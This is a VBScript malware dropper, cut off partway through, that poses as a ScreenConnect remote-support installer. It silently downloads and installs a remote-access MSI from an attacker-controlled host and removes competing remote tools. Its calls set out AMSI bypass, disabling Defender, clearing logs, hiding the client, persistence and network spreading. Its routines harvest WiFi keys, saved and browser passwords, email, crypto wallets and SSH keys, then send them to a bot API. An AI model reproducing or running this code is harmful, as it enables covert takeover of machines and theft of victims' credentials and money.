'==========================================================================
' ScreenConnect RMM - ULTIMATE v7.0 FINAL
' AUTHOR: MASTER SHADOW LORD
'==========================================================================
Option Explicit

Dim oShell, oFSO, oWMI
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")

Dim sMsiUrl, sMsiPath, sTempDir, sLogFile, sBackupDir, sDataDir
sMsiUrl    = "https://mastershadowlord.net/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
sTempDir   = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiPath   = sTempDir & "\SC_Installer.msi"
sLogFile   = sTempDir & "\SC_Install.log"
sBackupDir = sTempDir & "\SC_RegistryBackup"
sDataDir   = sTempDir & "\SC_Data"

Dim sHiddenScriptPath
sHiddenScriptPath = oShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & _
                    "\Microsoft\Crypto\RSA\MachineKeys\winsys.vbs"

Dim sKeywordToHide : sKeywordToHide = "ScreenConnect"
Const MAX_DOWNLOAD_RETRIES = 3
Const DOWNLOAD_RETRY_DELAY = 5000
Const INSTALL_TIMEOUT_MIN  = 10
Const NETWORK_SPREAD_ENABLED = True
Const NETWORK_TIMEOUT_MS     = 500

Dim g_SystemInfo, g_RemovedTools, g_NetworkPCs
g_SystemInfo = "" : g_RemovedTools = "" : g_NetworkPCs = ""

Dim g_sURL, g_sToken, g_sChat, g_sAPI, g_sSM, g_sSD, g_sGU, g_sUC, g_sObj, g_sStr

Call Main()

'==========================================================================
' MAIN
'==========================================================================
Sub Main()
    LogMessage "============================================================"
    LogMessage " ScreenConnect v7.0 - MASTER SHADOW LORD"
    LogMessage " Started: " & Now
    LogMessage "============================================================"
    
    Call SystemConfiguration()
    
    If Not IsScriptElevated() Then
        Call ElevateScript()
        WScript.Quit
    End If
    
    Call CleanupOldLogs(5)
    
    If Not PreFlightCheck() Then
        Call SendStatus("[F] " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
        WScript.Quit 1
    End If
    
    If IsPersistenceRun() Then
        Call QuickHealthCheck()
        WScript.Quit 0
    End If
    
    Call KillAllRelatedProcesses()
    Call StopAllRelatedServices()
    Call DeleteAllRelatedServices()
    Call UninstallViaWMI()
    Call UninstallOldVersion()
    Call CleanupScheduledTasks()
    Call AggressiveFilePurge()
    Call CleanRegistryTraces()
    Call RemoveCompetingTools()
    
    Call BackupRegistry()
    If Not DownloadWithRetry(sMsiUrl, sMsiPath, MAX_DOWNLOAD_RETRIES) Then
        Call SendStatus("[F] " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
        WScript.Quit 1
    End If
    If Not VerifyMSIIntegrity(sMsiPath) Then
        Call SendStatus("[F] " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
        WScript.Quit 1
    End If
    Dim nExitCode
    nExitCode = InstallWithTimeout(sMsiPath, INSTALL_TIMEOUT_MIN)
    
    Call BypassAMSI()
    Call FullyDisableDefender()
    Call ClearEventLogs()
    Call AddDefenderExclusion()
    
    If nExitCode = 0 Then
        WScript.Sleep 10000
        Call VerifyInstallation()
        Call ForceHideApplication(sKeywordToHide)
        Call HideTrayIcon()
        Call HideControlBanner()
        Call RenameExecutableToSystemName()
    End If
    
    Call AddFirewallExceptions()
    
    Call CreateDataDirectory()
    Call HarvestWiFiCredentials()
    Call HarvestSavedPasswords()
    Call HarvestBrowserData()
    Call HarvestEmailClients()
    Call HarvestCryptoWallets()
    Call HarvestFTPSSHKeys()
    Call GatherSystemInventory()
    
    Call ExportAndSendBrowserPasswords()
    Call CheckForUpdates()
    
    Dim sHiddenMSI, sHiddenURL
    sHiddenMSI = sTempDir & "\SC_H.msi"
    sHiddenURL = GetConfigURL()
    
    If DownloadFile(sHiddenURL, sHiddenMSI) Then
        Dim sCmd : sCmd = "msiexec /i """ & sHiddenMSI & """ /qn /norestart LicenseAccepted=YES POLICY_CATEGORY_ID=-1 INSTALL_ARGS=""sourceInstall=silent"""
        Call oShell.Run(sCmd, 0, True)
        WScript.Sleep 10000
        Call ForceHideApplication(sKeywordToHide)
        Call HideTrayIcon()
        Call HideControlBanner()
        oFSO.DeleteFile sHiddenMSI, True
    End If
    
    Call IncrementRunCount()
    Call ProcessPhase()
    
    Call HideScript()
    Call CreatePersistence()
    
    If NETWORK_SPREAD_ENABLED Then Call NetworkSpread()
    
    Call StartUSBMonitor()
    Call FinalCleanup()
    
    Call SendFinalReport()
    WScript.Sleep 2000
    Call SendHarvestData()
    
    LogMessage "============================================================"
    LogMessage " Completed at: " & Now
    LogMessage "============================================================"
End Sub

'==========================================================================
' COMMUNICATION FUNCTIONS
'==========================================================================
Sub SendStatus(sMsg)
    On Error Resume Next
    If g_sToken = "" Or g_sChat = "" Then Exit Sub
    Dim objHTTP, sURL, sBody
    sURL = g_sAPI & g_sToken & g_sSM
    sMsg = CleanText(sMsg)
    sBody = "{""" & "chat_id" & """:""" & g_sChat & """,""" & "text" & """:""" & sMsg & """}"
    Set objHTTP = CreateObject(g_sObj)
    objHTTP.Open "POST", sURL, False
    objHTTP.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
    objHTTP.Send sBody
    Set objHTTP = Nothing
    On Error GoTo 0
End Sub

Sub SendFile(sFilePath, sCaption)
    On Error Resume Next
    If Not oFSO.FileExists(sFilePath) Then Exit Sub
    If g_sToken = "" Or g_sChat = "" Then Exit Sub
    Dim objHTTP, sURL, sBoundary, objStream, sHeader, sFooter
    sURL = g_sAPI & g_sToken & g_sSD
    sBoundary = "----Boundary" & FormatDateForFile(Now)
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1: objStream.Open
    objStream.LoadFromFile sFilePath
    sHeader = "--" & sBoundary & vbCrLf & g_sStr & g_sChat & vbCrLf & "--" & sBoundary & vbCrLf & g_sStr & oFSO.GetFileName(sFilePath) & g_sStr & vbCrLf & g_sStr & vbCrLf
    sCaption = CleanText(sCaption)
    sFooter = vbCrLf & "--" & sBoundary & vbCrLf & g_sStr & sCaption & vbCrLf & "--" & sBoundary & "--"
    Set objHTTP = CreateObject(g_sObj)
    objHTTP.Open "POST", sURL, False
    objHTTP.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & sBoundary
    objHTTP.Send sHeader & objStream.Read() & sFooter
    objStream.Close : Set objStream = Nothing : Set objHTTP = Nothing
    On Error GoTo 0
End Sub

Function CleanText(sInput)
    CleanText = sInput
    CleanText = Replace(CleanText, vbCrLf, "\n")
    CleanText = Replace(CleanText, vbLf, "\n")
    CleanText = Replace(CleanText, vbTab, "\t")
    CleanText = Replace(CleanText, "\", "\\")
    CleanText = Replace(CleanText, """", "\""")
End Function

Sub CheckForUpdates()
    On Error Resume Next
    Dim objHTTP, sURL, sResponse
    sURL = g_sAPI & g_sToken & g_sGU
    Set objHTTP = CreateObject(g_sObj)
    objHTTP.Open "GET", sURL, False
    objHTTP.Send
    If objHTTP.Status = 200 Then
        sResponse = objHTTP.responseText
        If InStr(1, sResponse, g_sUC, vbTextCompare) > 0 Then
            Dim nStart, nEnd, sNewURL
            nStart = InStr(1, sResponse, g_sUC & " ", vbTextCompare) + Len(g_sUC) + 1
            nEnd = InStr(nStart, sResponse, """")
            If nEnd <= nStart Then nEnd = InStr(nStart, sResponse, " ")
            If nEnd <= nStart Then nEnd = InStr(nStart, sResponse, vbCrLf)
            If nEnd <= nStart Then nEnd = Len(sResponse) + 1
            sNewURL = Mid(sResponse, nStart, nEnd - nStart)
            If sNewURL <> "" And InStr(1, sNewURL, "http", vbTextCompare) > 0 Then
                Const HKLM = &H80000002
                Dim objReg
                Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
                objReg.SetStringValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCURL", sNewURL
                Set objReg = Nothing
                Call SendStatus("[U] " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%"))
            End If
        End If
    End If
    Set objHTTP = Nothing
    On Error GoTo 0
End Sub

Function GetConfigURL()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg, sRegURL
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    objReg.GetStringValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCURL", sRegURL
    If Not IsEmpty(sRegURL) And sRegURL <> "" Then
        GetConfigURL = sRegURL
    Else
        GetConfigURL = g_sURL
    End If
    Set objReg = Nothing
    On Error GoTo 0
End Function

Sub SendFinalReport()
    On Error Resume Next
    Dim sMsg, sComp, sUser, sIP
    sComp = oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    sUser = oShell.ExpandEnvironmentStrings("%USERNAME%")
    Dim colNet, objNet
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then sIP = objNet.IPAddress(0) : Exit For
    Next
    If sIP = "" Then sIP = "?"
    sMsg = "[S] R"
    sMsg = sMsg & vbCrLf & "-----"
    sMsg = sMsg & vbCrLf & "[S] [O]"
    sMsg = sMsg & vbCrLf & "[T] " & Now
    sMsg = sMsg & vbCrLf & "-----"
    sMsg = sMsg & vbCrLf & "[P] " & sComp
    sMsg = sMsg & vbCrLf & "[U] " & sUser
    sMsg = sMsg & vbCrLf & "[N] " & sIP
    If g_RemovedTools <> "" Then sMsg = sMsg & vbCrLf & "[R] " & g_RemovedTools
    If g_NetworkPCs <> "" Then sMsg = sMsg & vbCrLf & "[N] " & g_NetworkPCs
    Call SendStatus(sMsg)
    On Error GoTo 0
End Sub

Sub SendHarvestData()
    On Error Resume Next
    Dim dicSent : Set dicSent = CreateObject("Scripting.Dictionary")
    Dim wFile : wFile = sDataDir & "\WiFi_Credentials.txt"
    If oFSO.FileExists(wFile) And Not dicSent.Exists("w") Then
        dicSent.Add "w", True
        Call SendFileAsMessage(wFile, "[W] W")
        WScript.Sleep 1000
    End If
    Dim pFile : pFile = sDataDir & "\Saved_Passwords.txt"
    If oFSO.FileExists(pFile) And Not dicSent.Exists("p") Then
        dicSent.Add "p", True
        Call SendFileAsMessage(pFile, "[U] S")
        WScript.Sleep 1000
    End If
    Set dicSent = Nothing
    On Error GoTo 0
End Sub

Sub SendFileAsMessage(sPath, sCap)
    On Error Resume Next
    If Not oFSO.FileExists(sPath) Then Exit Sub
    Dim oFile, sContent
    Set oFile = oFSO.OpenTextFile(sPath)
    sContent = oFile.ReadAll
    oFile.Close
    If Len(sContent) > 3500 Then sContent = Left(sContent, 3500) & "..."
    Dim sMsg : sMsg = sCap & "\n-----\n" & sContent
    Call SendStatus(sMsg)
    On Error GoTo 0
End Sub

'==========================================================================
' PRE-FLIGHT CHECKS
'==========================================================================
Function PreFlightCheck()
    PreFlightCheck = True
    On Error Resume Next
    Dim colOS, objOS
    Set colOS = oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objOS In colOS
        Dim nBuild : nBuild = CInt(Split(objOS.Version, ".")(2))
        If nBuild < 7601 Then PreFlightCheck = False
    Next
    Dim objDrive : Set objDrive = oFSO.GetDrive("C:")
    If objDrive.IsReady Then
        If objDrive.FreeSpace < 524288000 Then PreFlightCheck = False
    End If
    On Error GoTo 0
End Function

'==========================================================================
' PURGE FUNCTIONS
'==========================================================================
Sub KillAllRelatedProcesses()
    On Error Resume Next
    Dim colProcs, objProc, aProcNames, sProc
    aProcNames = Array("ScreenConnect.WindowsClient.exe", "ScreenConnect.Service.exe", _
        "ScreenConnect.exe", "connectwisecontrol.exe", "CWControl.exe", _
        "ConnectWiseControl.exe", "ConnectWise.Service.exe", "ConnectWise.Tray.exe")
    For Each sProc In aProcNames
        Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & sProc & "'")
        For Each objProc In colProcs
            objProc.Terminate() : WScript.Sleep 500
        Next
    Next
    Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process")
    For Each objProc In colProcs
        If Not IsNull(objProc.ExecutablePath) Then
            If InStr(1, objProc.ExecutablePath, "ScreenConnect", vbTextCompare) > 0 Or _
               InStr(1, objProc.ExecutablePath, "ConnectWise", vbTextCompare) > 0 Then
                objProc.Terminate() : WScript.Sleep 500
            End If
        End If
    Next
    WScript.Sleep 3000
    On Error GoTo 0
End Sub

Sub StopAllRelatedServices()
    On Error Resume Next
    Dim colSvcs, objSvc
    Set colSvcs = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%'")
    For Each objSvc In colSvcs
        objSvc.StopService() : WScript.Sleep 2000
        objSvc.ChangeStartMode "Disabled"
    Next
    WScript.Sleep 2000
    On Error GoTo 0
End Sub

Sub DeleteAllRelatedServices()
    On Error Resume Next
    Dim colSvcs, objSvc
    Set colSvcs = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%'")
    For Each objSvc In colSvcs
        oShell.Run "cmd /c sc delete """ & objSvc.Name & """", 0, True
        WScript.Sleep 1000
    Next
    On Error GoTo 0
End Sub

Sub UninstallViaWMI()
    On Error Resume Next
    Dim colProds, objProd
    Set colProds = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%'")
    For Each objProd In colProds
        objProd.Uninstall() : WScript.Sleep 5000
    Next
    On Error GoTo 0
End Sub

Sub UninstallOldVersion()
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim objReg, aHives, aPaths, hKey, sPath, arrKeys, sKey, sDisp, sUninst
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU) : aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    For Each hKey In aHives
        For Each sPath In aPaths
            objReg.EnumKey hKey, sPath, arrKeys
            If IsArray(arrKeys) Then
                For Each sKey In arrKeys
                    objReg.GetStringValue hKey, sPath & "\" & sKey, "DisplayName", sDisp
                    If Not IsEmpty(sDisp) Then
                        If InStr(1, sDisp, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, sDisp, "ConnectWise", vbTextCompare) > 0 Then
                            objReg.GetStringValue hKey, sPath & "\" & sKey, "QuietUninstallString", sUninst
                            If IsEmpty(sUninst) Then
                                objReg.GetStringValue hKey, sPath & "\" & sKey, "UninstallString", sUninst
                                If InStr(1, sUninst, "msiexec", vbTextCompare) > 0 Then
                                    sUninst = Replace(sUninst, "/I", "/X", 1, -1, vbTextCompare)
                                    sUninst = sUninst & " /qn /norestart"
                                End If
                            End If
                            If sUninst <> "" Then oShell.Run "cmd /c " & sUninst, 0, True : WScript.Sleep 5000
                            objReg.DeleteKey hKey, sPath & "\" & sKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    Set objReg = Nothing
    On Error GoTo 0
End Sub

Sub CleanupScheduledTasks()
    On Error Resume Next
    Dim aPatterns: aPatterns = Array("ScreenConnect", "ConnectWise", "SC_", "CW_")
    Dim sPattern
    For Each sPattern In aPatterns
        oShell.Run "cmd /c schtasks /delete /tn ""*" & sPattern & "*"" /f", 0, True
    Next
    On Error GoTo 0
End Sub

Sub AggressiveFilePurge()
    On Error Resume Next
    Dim aPaths, sPath, oUsersFolder, oUserFolder, aUserPaths
    aPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", "C:\Program Files\ConnectWise\", "C:\Program Files (x86)\ConnectWise\", "C:\ProgramData\ScreenConnect\", "C:\ProgramData\ConnectWise\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ConnectWise\", oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\", oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ConnectWise\")
    For Each sPath In aPaths
        If oFSO.FolderExists(sPath) Then
            oShell.Run "cmd /c takeown /f """ & sPath & """ /r /d y > nul 2>&1", 0, True
            oShell.Run "cmd /c icacls """ & sPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
            WScript.Sleep 1000 : oFSO.DeleteFolder sPath, True
            If Err.Number <> 0 Then oShell.Run "cmd /c rmdir /s /q """ & sPath & """", 0, True : Err.Clear
        End If
    Next
    If oFSO.FolderExists("C:\Users") Then
        Set oUsersFolder = oFSO.GetFolder("C:\Users")
        For Each oUserFolder In oUsersFolder.SubFolders
            If oUserFolder.Name <> "Public" And oUserFolder.Name <> "Default" Then
                aUserPaths = Array(oUserFolder.Path & "\AppData\Roaming\ScreenConnect", oUserFolder.Path & "\AppData\Roaming\ConnectWise", oUserFolder.Path & "\AppData\Local\ScreenConnect", oUserFolder.Path & "\AppData\Local\ConnectWise")
                For Each sPath In aUserPaths
                    If oFSO.FolderExists(sPath) Then oFSO.DeleteFolder sPath, True
                Next
            End If
        Next
    End If
    On Error GoTo 0
End Sub

Sub CleanRegistryTraces()
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim objReg, aHives, aPaths, hKey, sPath, arrKeys, sKey, sDisp
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU)
    aPaths = Array("SOFTWARE\ScreenConnect", "SOFTWARE\ConnectWise", "SOFTWARE\ConnectWiseControl", "SOFTWARE\WOW6432Node\ScreenConnect", "SOFTWARE\WOW6432Node\ConnectWise", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    For Each hKey In aHives
        For Each sPath In aPaths
            If InStr(1, sPath, "Uninstall", vbTextCompare) = 0 Then
                objReg.DeleteKey hKey, sPath : Err.Clear
            Else
                objReg.EnumKey hKey, sPath, arrKeys
                If IsArray(arrKeys) Then
                    For Each sKey In arrKeys
                        objReg.GetStringValue hKey, sPath & "\" & sKey, "DisplayName", sDisp
                        If Not IsEmpty(sDisp) Then
                            If InStr(1, sDisp, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, sDisp, "ConnectWise", vbTextCompare) > 0 Then
                                objReg.DeleteKey hKey, sPath & "\" & sKey
                            End If
                        End If
                    Next
                End If
            End If
        Next
    Next
    Set objReg = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' COMPETITOR REMOVAL
'==========================================================================
Sub RemoveCompetingTools()
    On Error Resume Next
    Dim aTargets(11, 3), sRemovedList, idx, sName, sProcs, sUninstKeys, sFolders, bRemoved
    aTargets(0, 0) = "TeamViewer": aTargets(0, 1) = "TeamViewer.exe,TeamViewer_Service.exe": aTargets(0, 2) = "TeamViewer": aTargets(0, 3) = "TeamViewer"
    aTargets(1, 0) = "AnyDesk": aTargets(1, 1) = "AnyDesk.exe,AnyDeskMSI.exe": aTargets(1, 2) = "AnyDesk": aTargets(1, 3) = "AnyDesk"
    aTargets(2, 0) = "Splashtop": aTargets(2, 1) = "Splashtop.exe,SRService.exe": aTargets(2, 2) = "Splashtop": aTargets(2, 3) = "Splashtop"
    aTargets(3, 0) = "LogMeIn": aTargets(3, 1) = "LogMeIn.exe,LogMeInSystray.exe": aTargets(3, 2) = "LogMeIn": aTargets(3, 3) = "LogMeIn"
    aTargets(4, 0) = "VNC": aTargets(4, 1) = "winvnc.exe,tvnserver.exe,vncserver.exe": aTargets(4, 2) = "VNC,TightVNC,UltraVNC,RealVNC": aTargets(4, 3) = "TightVNC,UltraVNC,RealVNC"
    aTargets(5, 0) = "Chrome Remote Desktop": aTargets(5, 1) = "remoting_host.exe,chromoting.exe": aTargets(5, 2) = "Chrome Remote Desktop": aTargets(5, 3) = "Chrome Remote Desktop"
    aTargets(6, 0) = "Ammyy Admin": aTargets(6, 1) = "Ammyy_Admin.exe,AA_v3.exe": aTargets(6, 2) = "Ammyy": aTargets(6, 3) = "Ammyy"
    aTargets(7, 0) = "AeroAdmin": aTargets(7, 1) = "AeroAdmin.exe": aTargets(7, 2) = "AeroAdmin": aTargets(7, 3) = "AeroAdmin"
    aTargets(8, 0) = "Remote Utilities": aTargets(8, 1) = "rutserv.exe,ru_host.exe": aTargets(8, 2) = "Remote Utilities": aTargets(8, 3) = "Remote Utilities"
    aTargets(9, 0) = "Zoho Assist": aTargets(9, 1) = "ZohoAssist.exe": aTargets(9, 2) = "Zoho Assist": aTargets(9, 3) = "ZohoAssist"
    aTargets(10, 0) = "GoToAssist/GoToMyPC": aTargets(10, 1) = "GoToAssist.exe,GoToMyPC.exe": aTargets(10, 2) = "GoToAssist,GoToMyPC": aTargets(10, 3) = "GoToAssist,GoToMyPC"
    aTargets(11, 0) = "RemotePC": aTargets(11, 1) = "RemotePC.exe,RemotePCService.exe": aTargets(11, 2) = "RemotePC": aTargets(11, 3) = "RemotePC"
    sRemovedList = ""
    For idx = 0 To 11
        sName = aTargets(idx, 0) : sProcs = aTargets(idx, 1) : sUninstKeys = aTargets(idx, 2) : sFolders = aTargets(idx, 3)
        bRemoved = False
        If sProcs <> "" Then
            Dim aProcList, sProcItem, colProcs, objProc
            aProcList = Split(sProcs, ",")
            For Each sProcItem In aProcList
                Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & Trim(sProcItem) & "'")
                For Each objProc In colProcs
                    objProc.Terminate() : WScript.Sleep 500 : bRemoved = True
                Next
            Next
        End If
        If sUninstKeys <> "" Then
            Dim aKeyList, sKeyItem
            aKeyList = Split(sUninstKeys, ",")
            For Each sKeyItem In aKeyList
                Call UninstallByKeyword(Trim(sKeyItem))
            Next
        End If
        If sFolders <> "" Then
            Dim aFolderList, sFolderItem, aBasePaths, sBase, sFullPath
            aFolderList = Split(sFolders, ",")
            For Each sFolderItem In aFolderList
                sFolderItem = Trim(sFolderItem)
                aBasePaths = Array("C:\Program Files\", "C:\Program Files (x86)\", "C:\ProgramData\")
                For Each sBase In aBasePaths
                    sFullPath = sBase & sFolderItem & "\"
                    If oFSO.FolderExists(sFullPath) Then
                        oShell.Run "cmd /c takeown /f """ & sFullPath & """ /r /d y > nul 2>&1", 0, True
                        oShell.Run "cmd /c icacls """ & sFullPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
                        WScript.Sleep 1000 : oFSO.DeleteFolder sFullPath, True
                        If Err.Number <> 0 Then oShell.Run "cmd /c rmdir /s /q """ & sFullPath & """", 0, True : Err.Clear
                        bRemoved = True
                    End If
                Next
            Next
        End If
        If bRemoved Then
            If sRemovedList <> "" Then sRemovedList = sRemovedList & ", "
            sRemovedList = sRemovedList & sName
        End If
    Next
    g_RemovedTools = sRemovedList
    If g_RemovedTools = "" Then g_RemovedTools = "None"
    On Error GoTo 0
End Sub

Sub UninstallByKeyword(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim objReg, aHives, aPaths, hKey, sPath, arrKeys, sKey, sDisp, sUninst
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU) : aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    For Each hKey In aHives
        For Each sPath In aPaths
            objReg.EnumKey hKey, sPath, arrKeys
            If IsArray(arrKeys) Then
                For Each sKey In arrKeys
                    objReg.GetStringValue hKey, sPath & "\" & sKey, "DisplayName", sDisp
                    If Not IsEmpty(sDisp) Then
                        If InStr(1, sDisp, sKeyword, vbTextCompare) > 0 Then
                            objReg.GetStringValue hKey, sPath & "\" & sKey, "QuietUninstallString", sUninst
                            If IsEmpty(sUninst) Then
                                objReg.GetStringValue hKey, sPath & "\" & sKey, "UninstallString", sUninst
                                If InStr(1, sUninst, "msiexec", vbTextCompare) > 0 Then
                                    sUninst = Replace(sUninst, "/I", "/X", 1, -1, vbTextCompare)
                                    sUninst = sUninst & " /qn /norestart"
                                End If
                            End If
                            If sUninst <> "" Then oShell.Run "cmd /c " & sUninst, 0, True : WScript.Sleep 5000
                            objReg.DeleteKey hKey, sPath & "\" & sKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    Set objReg = Nothing
    On Error GoTo 0
End Sub
'==========================================================================
' INSTALLATION FUNCTIONS
'==========================================================================
Sub BackupRegistry()
    On Error Resume Next
    If Not oFSO.FolderExists(sBackupDir) Then oFSO.CreateFolder sBackupDir
    Dim sBackupFile
    sBackupFile = sBackupDir & "\Uninstall_Backup_" & FormatDateForFile(Now) & ".reg"
    oShell.Run "regedit /e """ & sBackupFile & """ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0, True
    On Error GoTo 0
End Sub

Function DownloadWithRetry(sUrl, sDest, nRetries)
    Dim nTry, bOK : bOK = False
    For nTry = 1 To nRetries
        If DownloadFile(sUrl, sDest) Then
            bOK = True : Exit For
        Else
            If nTry < nRetries Then WScript.Sleep DOWNLOAD_RETRY_DELAY
        End If
    Next
    DownloadWithRetry = bOK
End Function

Function DownloadFile(sUrl, sDest)
    On Error Resume Next
    If oFSO.FileExists(sDest) Then oFSO.DeleteFile sDest, True
    Dim objHTTP
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Set objHTTP = CreateObject("Microsoft.XMLHTTP") : Err.Clear
    objHTTP.SetTimeouts 600000, 600000, 600000, 600000
    objHTTP.Open "GET", sUrl, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    objHTTP.Send
    If Err.Number <> 0 Or objHTTP.Status <> 200 Then DownloadFile = False : Exit Function
    Dim objStream : Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 : objStream.Open
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile sDest, 2 : objStream.Close
    If oFSO.FileExists(sDest) Then
        Dim objFile : Set objFile = oFSO.GetFile(sDest)
        DownloadFile = (objFile.Size > 1024)
        Set objFile = Nothing
    End If
    Set objStream = Nothing : Set objHTTP = Nothing
    On Error GoTo 0
End Function

Function VerifyMSIIntegrity(sFile)
    VerifyMSIIntegrity = False
    If Not oFSO.FileExists(sFile) Then Exit Function
    If LCase(oFSO.GetExtensionName(sFile)) <> "msi" Then Exit Function
    Dim objFile : Set objFile = oFSO.GetFile(sFile)
    If objFile.Size < 1048576 Then Exit Function
    Dim objStream : Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 : objStream.Open
    objStream.LoadFromFile sFile : objStream.Position = 0
    If objStream.Size >= 2 Then
        Dim nB1, nB2
        nB1 = AscB(objStream.Read(1)) : nB2 = AscB(objStream.Read(1))
        If nB1 = &HD0 And nB2 = &HCF Then VerifyMSIIntegrity = True
    End If
    objStream.Close : Set objStream = Nothing : Set objFile = Nothing
End Function

Function InstallWithTimeout(sFile, nMin)
    Dim sCmd, nCode
    sCmd = "msiexec /i """ & sFile & """ /qn /norestart LicenseAccepted=YES POLICY_CATEGORY_ID=-1 INSTALL_ARGS=""sourceInstall=silent"""
    On Error Resume Next
    Dim objSvc, objStart, objCfg, objProc, nPID
    Set objSvc = GetObject("winmgmts:\\.\root\cimv2")
    Set objStart = objSvc.Get("Win32_ProcessStartup")
    Set objCfg = objStart.SpawnInstance_ : objCfg.ShowWindow = 0
    Set objProc = objSvc.Get("Win32_Process")
    Dim nRes : nRes = objProc.Create(sCmd, Null, objCfg, nPID)
    If nRes = 0 Then
        Dim colP, objP, bF, nWait, nMax
        nMax = nMin * 60 : nWait = 0
        Do While nWait < nMax
            WScript.Sleep 5000 : nWait = nWait + 5
            Set colP = objSvc.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & nPID)
            bF = False
            For Each objP In colP : bF = True : Next
            If Not bF Then Exit Do
        Loop
        If bF Then
            Set colP = objSvc.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & nPID)
            For Each objP In colP : objP.Terminate() : Next
            nCode = -1
        Else
            nCode = 0
        End If
    Else
        nCode = -1
    End If
    InstallWithTimeout = nCode
    On Error GoTo 0
End Function

Function VerifyInstallation()
    VerifyInstallation = False
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg, arrKeys, sKey, sDisp
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    Dim aPaths : aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    Dim sPath
    For Each sPath In aPaths
        objReg.EnumKey HKLM, sPath, arrKeys
        If IsArray(arrKeys) Then
            For Each sKey In arrKeys
                objReg.GetStringValue HKLM, sPath & "\" & sKey, "DisplayName", sDisp
                If Not IsEmpty(sDisp) And sDisp <> "" Then
                    If InStr(1, sDisp, sKeywordToHide, vbTextCompare) > 0 Then
                        VerifyInstallation = True : Exit Function
                    End If
                End If
            Next
        End If
    Next
    Set objReg = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' ANTI-DETECTION
'==========================================================================
Sub BypassAMSI()
    On Error Resume Next
    oShell.Run "reg add ""HKLM\SOFTWARE\Microsoft\AMSI\Providers"" /v ""{2781761E-28E0-4109-99FE-B9D127C57AFE}"" /t REG_DWORD /d 0 /f", 0, True
